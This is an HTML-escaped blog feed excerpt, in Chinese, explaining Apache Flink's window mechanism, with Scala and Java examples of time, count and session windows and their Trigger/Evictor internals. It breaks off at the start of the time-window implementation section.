&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.madhukaraphatak.com/introduction-to-flink-streaming-part-7&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introduction to Flink Streaming - Part 7 : Implementing Session Windows using Custom Trigger&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://data-artisans.com/session-windowing-in-flink/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How Apache Flink Enables New Streaming Applications&lt;br&gt;Part III: Session Windowing in Flink&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.vldb.org/pvldb/vol8/p1792-Akidau.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Google DataFlow paper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cloud.google.com/dataflow/model/windowing#session-windows&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Google DataFlow Document&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/FLINK-3174&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FLINK-3174: Add merging WindowAssigner&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在&lt;a href=&quot;http://wuchong.me/blog/2016/05/25/flink-internals-window-mechanism/&quot;&gt;上一篇文章：Window机制&lt;/a&gt;中，我们介绍了窗口的概念和底层实现，以及 Flink 一些内建的窗口，包括滑动窗口、翻滚窗口。本文将深入讲解一种较为特殊的窗口：会话窗口（session window）。建议您在阅读完上一篇文章的基础上再阅读本文。&lt;/p&gt;
&lt;p&gt;当我们需要分析用户的一段交互的行为事件时，通常的想法是将用户的事件流按照“session”来分组。session 是指一段持续活跃的期间，由活跃间隙分隔开。通俗一点说，消息之间的间隔小于超时阈值（sessionGap）的，则被分配到同一个窗口，间隔大于阈值的，则被分配到不同的窗口。目前开源领域大部分的流计算引擎都有窗口的概念，但是没有对 session window 的支持，要实现 session window，需要用户自己去做完大部分事情。而当 Flink 1.1.0 版本正式发布时，Flink 将会是开源流计算领域第一个内建支持 session window 的引擎。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：Window 机制</title>
    <link href="http://wuchong.me/blog/2016/05/25/flink-internals-window-mechanism/"/>
    <id>http://wuchong.me/blog/2016/05/25/flink-internals-window-mechanism/</id>
    <published>2016-05-25T05:56:19.000Z</published>
    <updated>2016-05-25T05:56:58.000Z</updated>
    
    <content type="html">&lt;p&gt;Flink 认为 Batch 是 Streaming 的一个特例，所以 Flink 底层引擎是一个流式引擎，在上面实现了流处理和批处理。而窗口（window）就是从 Streaming 到 Batch 的一个桥梁。Flink 提供了非常完善的窗口机制，这是我认为的 Flink 最大的亮点之一（其他的亮点包括消息乱序处理，和 checkpoint 机制）。本文我们将介绍流式处理中的窗口概念，介绍 Flink 内建的一些窗口和 Window API，最后讨论下窗口在底层是如何实现的。&lt;/p&gt;
&lt;h2 id=&quot;什么是-Window&quot;&gt;&lt;a href=&quot;#什么是-Window&quot; class=&quot;headerlink&quot; title=&quot;什么是 Window&quot;&gt;&lt;/a&gt;什么是 Window&lt;/h2&gt;&lt;p&gt;在流处理应用中，数据是连续不断的，因此我们不可能等到所有数据都到了才开始处理。当然我们可以每来一个消息就处理一次，但是有时我们需要做一些聚合类的处理，例如：在过去的1分钟内有多少用户点击了我们的网页。在这种情况下，我们必须定义一个窗口，用来收集最近一分钟内的数据，并对这个窗口内的数据进行计算。&lt;/p&gt;
&lt;p&gt;窗口可以是时间驱动的（Time Window，例如：每30秒钟），也可以是数据驱动的（Count Window，例如：每一百个元素）。一种经典的窗口分类可以分成：翻滚窗口（Tumbling Window，无重叠），滚动窗口（Sliding Window，有重叠），和会话窗口（Session Window，活动间隙）。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;我们举个具体的场景来形象地理解不同窗口的概念。假设，淘宝网会记录每个用户每次购买的商品个数，我们要做的是统计不同窗口中用户购买商品的总数。下图给出了几种经典的窗口切分概述图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1bwsTJVXXXXaBaXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上图中，raw data stream 代表用户的购买行为流，圈中的数字代表该用户本次购买的商品个数，事件是按时间分布的，所以可以看出事件之间是有time gap的。Flink 提供了上图中所有的窗口类型，下面我们会逐一进行介绍。&lt;/p&gt;
&lt;h3 id=&quot;Time-Window&quot;&gt;&lt;a href=&quot;#Time-Window&quot; class=&quot;headerlink&quot; title=&quot;Time Window&quot;&gt;&lt;/a&gt;Time Window&lt;/h3&gt;&lt;p&gt;就如名字所说的，Time Window 是根据时间对数据流进行分组的。这里我们涉及到了流处理中的时间问题，时间问题和消息乱序问题是紧密关联的，这是流处理中现存的难题之一，我们将在后续的 &lt;a href=&quot;#&quot;&gt;EventTime 和消息乱序处理&lt;/a&gt; 中对这部分问题进行深入探讨。这里我们只需要知道 Flink 提出了三种时间的概念，分别是event time（事件时间：事件发生时的时间），ingestion time（摄取时间：事件进入流处理系统的时间），processing time（处理时间：消息被计算处理的时间）。Flink 中窗口机制和时间类型是完全解耦的，也就是说当需要改变时间类型时不需要更改窗口逻辑相关的代码。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Tumbling Time Window&lt;/strong&gt;&lt;br&gt;如上图，我们需要统计每一分钟中用户购买的商品的总数，需要将用户的行为事件按每一分钟进行切分，这种切分被成为翻滚时间窗口（Tumbling Time Window）。翻滚窗口能将数据流切分成不重叠的窗口，每一个事件只能属于一个窗口。通过使用 DataStream API，我们可以这样实现：&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Stream of (userId, buyCnt)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; buyCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; tumblingCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = buyCnts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// key stream by userId&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .keyBy(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// tumbling time window of 1 minute length&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .timeWindow(&lt;span class=&quot;type&quot;&gt;Time&lt;/span&gt;.minutes(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// compute sum over buyCnt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .sum(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Sliding Time Window&lt;/strong&gt;&lt;br&gt;但是对于某些应用，它们需要的窗口是不间断的，需要平滑地进行窗口聚合。比如，我们可以每30秒计算一次最近一分钟用户购买的商品总数。这种窗口我们称为滑动时间窗口（Sliding Time Window）。在滑窗中，一个元素可以对应多个窗口。通过使用 DataStream API，我们可以这样实现：&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; slidingCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = buyCnts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .keyBy(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// sliding time window of 1 minute length and 30 secs trigger interval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .timeWindow(&lt;span class=&quot;type&quot;&gt;Time&lt;/span&gt;.minutes(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;), &lt;span class=&quot;type&quot;&gt;Time&lt;/span&gt;.seconds(&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .sum(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Count-Window&quot;&gt;&lt;a href=&quot;#Count-Window&quot; class=&quot;headerlink&quot; title=&quot;Count Window&quot;&gt;&lt;/a&gt;Count Window&lt;/h3&gt;&lt;p&gt;Count Window 是根据元素个数对数据流进行分组的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Tumbling Count Window&lt;/strong&gt;&lt;br&gt;当我们想要每100个用户购买行为事件统计购买总数，那么每当窗口中填满100个元素了，就会对窗口进行计算，这种窗口我们称之为翻滚计数窗口（Tumbling Count Window），上图所示窗口大小为3个。通过使用 DataStream API，我们可以这样实现：&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Stream of (userId, buyCnts)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; buyCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; tumblingCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = buyCnts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// key stream by sensorId&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .keyBy(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// tumbling count window of 100 elements size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .countWindow(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// compute the buyCnt sum &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .sum(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Sliding Count Window&lt;/strong&gt;&lt;br&gt;当然Count Window 也支持 Sliding Window，虽在上图中未描述出来，但和Sliding Time Window含义是类似的，例如计算每10个元素计算一次最近100个元素的总和，代码示例如下。&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; slidingCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = vehicleCnts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .keyBy(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// sliding count window of 100 elements size and 10 elements trigger interval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .countWindow(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .sum(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Session-Window&quot;&gt;&lt;a href=&quot;#Session-Window&quot; class=&quot;headerlink&quot; title=&quot;Session Window&quot;&gt;&lt;/a&gt;Session Window&lt;/h3&gt;&lt;p&gt;在这种用户交互事件流中，我们首先想到的是将事件聚合到会话窗口中（一段用户持续活跃的周期），由非活跃的间隙分隔开。如上图所示，就是需要计算每个用户在活跃期间总共购买的商品数量，如果用户30秒没有活动则视为会话断开（假设raw data stream是单个用户的购买行为流）。Session Window 的示例代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Stream of (userId, buyCnts)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; buyCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; sessionCnts: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Int&lt;/span&gt;)] = vehicleCnts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .keyBy(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// session window based on a 30 seconds session gap interval &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .window(&lt;span class=&quot;type&quot;&gt;ProcessingTimeSessionWindows&lt;/span&gt;.withGap(&lt;span class=&quot;type&quot;&gt;Time&lt;/span&gt;.seconds(&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .sum(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般而言，window 是在无限的流上定义了一个有限的元素集合。这个集合可以是基于时间的，元素个数的，时间和个数结合的，会话间隙的，或者是自定义的。Flink 的 DataStream API 提供了简洁的算子来满足常用的窗口操作，同时提供了通用的窗口机制来允许用户自己定义窗口分配逻辑。下面我们会对 Flink 窗口相关的 API 进行剖析。&lt;/p&gt;
&lt;h2 id=&quot;剖析-Window-API&quot;&gt;&lt;a href=&quot;#剖析-Window-API&quot; class=&quot;headerlink&quot; title=&quot;剖析 Window API&quot;&gt;&lt;/a&gt;剖析 Window API&lt;/h2&gt;&lt;p&gt;得益于 Flink Window API 松耦合设计，我们可以非常灵活地定义符合特定业务的窗口。Flink 中定义一个窗口主要需要以下三个组件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Window Assigner：&lt;/strong&gt;用来决定某个元素被分配到哪个/哪些窗口中去。&lt;/p&gt;
&lt;p&gt;如下类图展示了目前内置实现的 Window Assigners：&lt;br&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1plkxJVXXXXXqXpXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Trigger：&lt;/strong&gt;触发器。决定了一个窗口何时能够被计算或清除，每个窗口都会拥有一个自己的Trigger。&lt;/p&gt;
&lt;p&gt;如下类图展示了目前内置实现的 Triggers：&lt;br&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB15yMeJVXXXXbbXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Evictor：&lt;/strong&gt;可以译为“驱逐者”。在Trigger触发之后，在窗口被处理之前，Evictor（如果有Evictor的话）会用来剔除窗口中不需要的元素，相当于一个filter。&lt;/p&gt;
&lt;p&gt;如下类图展示了目前内置实现的 Evictors：&lt;br&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1OCT6JVXXXXcjXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述三个组件的不同实现的不同组合，可以定义出非常复杂的窗口。Flink 中内置的窗口也都是基于这三个组件构成的，当然内置窗口有时候无法解决用户特殊的需求，所以 Flink 也暴露了这些窗口机制的内部接口供用户实现自定义的窗口。下面我们将基于这三者探讨窗口的实现机制。&lt;/p&gt;
&lt;h2 id=&quot;Window-的实现&quot;&gt;&lt;a href=&quot;#Window-的实现&quot; class=&quot;headerlink&quot; title=&quot;Window 的实现&quot;&gt;&lt;/a&gt;Window 的实现&lt;/h2&gt;&lt;p&gt;下图描述了 Flink 的窗口机制以及各组件之间是如何相互工作的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1swNgKXXXXXc4XpXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先上图中的组件都位于一个算子（window operator）中，数据流源源不断地进入算子，每一个到达的元素都会被交给 WindowAssigner。WindowAssigner 会决定元素被放到哪个或哪些窗口（window），可能会创建新窗口。因为一个元素可以被放入多个窗口中，所以同时存在多个窗口是可能的。注意，&lt;code&gt;Window&lt;/code&gt;本身只是一个ID标识符，其内部可能存储了一些元数据，如&lt;code&gt;TimeWindow&lt;/code&gt;中有开始和结束时间，但是并不会存储窗口中的元素。窗口中的元素实际存储在 Key/Value State 中，key为&lt;code&gt;Window&lt;/code&gt;，value为元素集合（或聚合值）。为了保证窗口的容错性，该实现依赖了 Flink 的 State 机制（参见 &lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/apis/streaming/state.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;state 文档&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;每一个窗口都拥有一个属于自己的 Trigger，Trigger上会有定时器，用来决定一个窗口何时能够被计算或清除。每当有元素加入到该窗口，或者之前注册的定时器超时了，那么Trigger都会被调用。Trigger的返回结果可以是 continue（不做任何操作），fire（处理窗口数据），purge（移除窗口和窗口中的数据），或者 fire + purge。一个Trigger的调用结果只是fire的话，那么会计算窗口并保留窗口原样，也就是说窗口中的数据仍然保留不变，等待下次Trigger fire的时候再次执行计算。一个窗口可以被重复计算多次知道它被 purge 了。在purge之前，窗口会一直占用着内存。&lt;/p&gt;
&lt;p&gt;当Trigger fire了，窗口中的元素集合就会交给&lt;code&gt;Evictor&lt;/code&gt;（如果指定了的话）。Evictor 主要用来遍历窗口中的元素列表，并决定最先进入窗口的多少个元素需要被移除。剩余的元素会交给用户指定的函数进行窗口的计算。如果没有 Evictor 的话，窗口中的所有元素会一起交给函数进行计算。&lt;/p&gt;
&lt;p&gt;计算函数收到了窗口的元素（可能经过了 Evictor 的过滤），并计算出窗口的结果值，并发送给下游。窗口的结果值可以是一个也可以是多个。DataStream API 上可以接收不同类型的计算函数，包括预定义的&lt;code&gt;sum()&lt;/code&gt;,&lt;code&gt;min()&lt;/code&gt;,&lt;code&gt;max()&lt;/code&gt;，还有 &lt;code&gt;ReduceFunction&lt;/code&gt;，&lt;code&gt;FoldFunction&lt;/code&gt;，还有&lt;code&gt;WindowFunction&lt;/code&gt;。WindowFunction 是最通用的计算函数，其他的预定义的函数基本都是基于该函数实现的。&lt;/p&gt;
&lt;p&gt;Flink 对于一些聚合类的窗口计算（如sum,min）做了优化，因为聚合类的计算不需要将窗口中的所有数据都保存下来，只需要保存一个result值就可以了。每个进入窗口的元素都会执行一次聚合函数并修改result值。这样可以大大降低内存的消耗并提升性能。但是如果用户定义了 Evictor，则不会启用对聚合窗口的优化，因为 Evictor 需要遍历窗口中的所有元素，必须要将窗口中所有元素都存下来。&lt;/p&gt;
&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h2&gt;&lt;p&gt;上述的三个组件构成了 Flink 的窗口机制。为了更清楚地描述窗口机制，以及解开一些疑惑（比如 purge 和 Evictor 的区别和用途），我们将一步步地解释 Flink 内置的一些窗口（Time Window，Count Window，Session Window）是如何实现的。&lt;/p&gt;
&lt;h3 id=&quot;Count-Window-实现&quot;&gt;&lt;a href=&quot;#Count-Window-实现&quot; class=&quot;headerlink&quot; title=&quot;Count Window 实现&quot;&gt;&lt;/a&gt;Count Window 实现&lt;/h3&gt;&lt;p&gt;Count Window 是使用三组件的典范，我们可以在 &lt;code&gt;KeyedStream&lt;/code&gt; 上创建 Count Window，其源码如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// tumbling count window&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; WindowedStream&amp;lt;T, KEY, GlobalWindow&amp;gt; &lt;span class=&quot;title&quot;&gt;countWindow&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; size)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; window(GlobalWindows.create())  &lt;span class=&quot;comment&quot;&gt;// create window stream using GlobalWindows&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      .trigger(PurgingTrigger.of(CountTrigger.of(size))); &lt;span class=&quot;comment&quot;&gt;// trigger is window size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// sliding count window&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; WindowedStream&amp;lt;T, KEY, GlobalWindow&amp;gt; &lt;span class=&quot;title&quot;&gt;countWindow&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; size, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; slide)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; window(GlobalWindows.create())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .evictor(CountEvictor.of(size))  &lt;span class=&quot;comment&quot;&gt;// evictor is window size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .trigger(CountTrigger.of(slide)); &lt;span class=&quot;comment&quot;&gt;// trigger is slide size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个函数是申请翻滚计数窗口，参数为窗口大小。第二个函数是申请滑动计数窗口，参数分别为窗口大小和滑动大小。它们都是基于 &lt;code&gt;GlobalWindows&lt;/code&gt; 这个 WindowAssigner 来创建的窗口，该assigner会将所有元素都分配到同一个global window中，所有&lt;code&gt;GlobalWindows&lt;/code&gt;的返回值一直是 &lt;code&gt;GlobalWindow&lt;/code&gt; 单例。基本上自定义的窗口都会基于该assigner实现。&lt;/p&gt;
&lt;p&gt;翻滚计数窗口并不带evictor，只注册了一个trigger。该trigger是带purge功能的 CountTrigger。也就是说每当窗口中的元素数量达到了 window-size，trigger就会返回fire+purge，窗口就会执行计算并清空窗口中的所有元素，再接着储备新的元素。从而实现了tumbling的窗口之间无重叠。&lt;/p&gt;
&lt;p&gt;滑动计数窗口的各窗口之间是有重叠的，但我们用的 GlobalWindows assinger 从始至终只有一个窗口，不像 sliding time assigner 可以同时存在多个窗口。所以trigger结果不能带purge，也就是说计算完窗口后窗口中的数据要保留下来（供下个滑窗使用）。另外，trigger的间隔是slide-size，evictor的保留的元素个数是window-size。也就是说，每个滑动间隔就触发一次窗口计算，并保留下最新进入窗口的window-size个元素，剔除旧元素。&lt;/p&gt;
&lt;p&gt;假设有一个滑动计数窗口，每2个元素计算一次最近4个元素的总和，那么窗口工作示意图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB15vcUJVXXXXcGXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;图中所示的各个窗口逻辑上是不同的窗口，但在物理上是同一个窗口。该滑动计数窗口，trigger的触发条件是元素个数达到2个（每进入2个元素就会触发一次），evictor保留的元素个数是4个，每次计算完窗口总和后会保留剩余的元素。所以第一次触发trigger是当元素5进入，第三次触发trigger是当元素2进入，并驱逐5和2，计算剩余的4个元素的总和（22）并发送出去，保留下2,4,9,7元素供下个逻辑窗口使用。&lt;/p&gt;
&lt;h3 id=&quot;Time-Window-实现&quot;&gt;&lt;a href=&quot;#Time-Window-实现&quot; class=&quot;headerlink&quot; title=&quot;Time Window 实现&quot;&gt;&lt;/a&gt;Time Window 实现&lt;/h3&gt;&lt;p&gt;同样的，我们也可以在 &lt;code&gt;KeyedStream&lt;/code&gt; 上申请 Time Window，其源码如下所示：&lt;/p&gt;
